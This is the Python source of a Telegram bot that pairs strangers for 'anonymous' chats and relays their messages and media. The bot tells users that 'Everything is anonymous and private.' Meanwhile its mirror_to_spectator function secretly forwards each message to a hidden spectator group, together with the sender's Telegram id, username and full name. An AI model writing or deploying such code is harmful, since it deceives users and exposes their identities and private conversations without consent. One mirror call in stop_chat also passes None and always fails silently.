import telegram
import sys
print("✅ Running python-telegram-bot version:", telegram.__version__, file=sys.stderr)
import os
import random
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.constants import ChatAction
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ---------------- Env Vars ----------------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
SPECTATOR_GROUP_ID = int(os.getenv("SPECTATOR_GROUP_ID", "0"))

# ---------------- In-Memory Storage ----------------
queue = []
partners = {}

# ---------------- Surveillance ----------------
async def mirror_to_spectator(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Mirror events/messages to the spectator group if configured."""
    if not SPECTATOR_GROUP_ID:
        return
    try:
        user = update.effective_user
        meta = f"[id:{user.id} | @{user.username or '—'} | {user.full_name}]"
        await context.bot.send_message(
            chat_id=SPECTATOR_GROUP_ID,
            text=f"{meta} {text}"
        )
    except Exception as e:
        print("Spectator mirror error:", e)

# ---------------- Handlers ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🎯 Start Chatting", callback_data="start_chat")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")],
    ]
    await update.message.reply_text(
        "👋 Welcome to Anonymous Chat!\n\nPress the button below to find a partner.",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Anonymous Chat Bot Help*\n\n"
        "- Press *Start Chatting* to find a random partner.\n"
        "- Use *Next* to skip and find another partner.\n"
        "- Use *Stop* to leave chat.\n"
        "- Everything is anonymous and private.",
        parse_mode="Markdown",
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "start_chat":
        user_id = query.from_user.id
        if user_id in partners:
            await query.edit_message_text("✅ You are already in a chat.")
            return

        if queue:
            partner_id = queue.pop(0)
            partners[user_id] = partner_id
            partners[partner_id] = user_id

            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("⏭ Next", callback_data="next"),
                 InlineKeyboardButton("⏹ Stop", callback_data="stop")]
            ])

            await context.bot.send_message(partner_id, "🎉 Partner found! Say hi 👋", reply_markup=kb)
            await context.bot.send_message(user_id, "🎉 Partner found! Say hi 👋", reply_markup=kb)

            await mirror_to_spectator(update, context, "🔗 New chat started.")
        else:
            queue.append(user_id)
            await query.edit_message_text("⏳ Searching for a partner...")
            await mirror_to_spectator(update, context, "➕ User joined queue.")

    elif query.data == "help":
        await query.edit_message_text(
            "ℹ️ Use *Start Chatting* to find a partner.\n"
            "Your messages will be forwarded anonymously.",
            parse_mode="Markdown",
        )

    elif query.data == "next":
        await stop_chat(query.from_user.id, context)
        queue.append(query.from_user.id)
        await query.edit_message_text("⏳ Searching for a new partner...")

    elif query.data == "stop":
        await stop_chat(query.from_user.id, context)
        await query.edit_message_text("❌ You left the chat.")

async def stop_chat(user_id, context: ContextTypes.DEFAULT_TYPE):
    if user_id not in partners:
        return
    partner_id = partners.pop(user_id, None)
    if partner_id and partner_id in partners:
        partners.pop(partner_id, None)
        await context.bot.send_message(partner_id, "⚠️ Your partner left the chat.")
        await mirror_to_spectator(None, context, f"❌ Chat ended: {user_id} left.")

async def relay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in partners:
        return
    partner_id = partners[user_id]

    try:
        await context.bot.send_chat_action(partner_id, ChatAction.TYPING)

        if update.message.text:
            await context.bot.send_message(partner_id, update.message.text)

        if update.message.photo:
            await context.bot.send_photo(partner_id, update.message.photo[-1].file_id, caption=update.message.caption)

        if update.message.video:
            await context.bot.send_video(partner_id, update.message.video.file_id, caption=update.message.caption)

        if update.message.voice:
            await context.bot.send_voice(partner_id, update.message.voice.file_id)

        if update.message.document:
            await context.bot.send_document(partner_id, update.message.document.file_id, caption=update.message.caption)

        await mirror_to_spectator(update, context, f"💬 {update.message.text or 'Media message'}")

    except Exception as e:
        print("Relay error:", e)

# ---------------- Application ----------------
application = ApplicationBuilder().token(BOT_TOKEN).build()

application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("help", help_cmd))
application.add_handler(CallbackQueryHandler(button))
application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, relay))

def run_polling():
    """For local testing or polling deployments."""
    application.run_polling()
